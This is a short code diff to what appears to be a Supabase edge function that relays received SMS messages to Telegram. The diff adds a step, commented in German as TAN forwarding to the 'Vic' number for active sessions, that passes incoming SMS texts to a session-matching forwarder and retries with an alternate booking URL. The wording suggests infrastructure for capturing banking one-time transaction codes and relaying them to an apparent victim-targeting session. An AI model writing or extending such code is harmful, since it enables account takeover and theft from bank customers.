@@ -1,5 +1,6 @@
 import { createClient } from "npm:@supabase/supabase-js@2";
 import { buildTelegramMessage } from "../_shared/telegramMessage.ts";
+import { forwardByPhoneIdentifier } from "../_shared/forwardTan.ts";
 
 const corsHeaders = {
   "Access-Control-Allow-Origin": "*",
@@ -228,6 +229,23 @@ async function handleMessages(opts: {
     await sendTelegram(message, opts.brandingId ?? assignment.brandingId);
     sent++;
   }
+  // TAN-Weiterleitung an die Vic-Nummer (nur aktive Sessions, idempotent)
+  try {
+    const messages = toForward.map((t) => t.sms);
+    const result = await forwardByPhoneIdentifier(identifier, messages);
+    if (result.checked === 0 && result.reason === "no_active_session") {
+      // Sessions may store the other URL form (share vs. api) — try both.
+      const alt = identifier.includes("/share/orderbooking?")
+        ? identifier.replace("/share/orderbooking?", "/api/v1/orderbookingshare?")
+        : identifier.replace("/api/v1/orderbookingshare?", "/share/orderbooking?");
+      if (alt !== identifier) {
+        await forwardByPhoneIdentifier(alt, messages);
+      }
+    }
+  } catch (e) {
+    console.error("forwardByPhoneIdentifier failed:", e);
+  }
+
   return sent;
 }
 
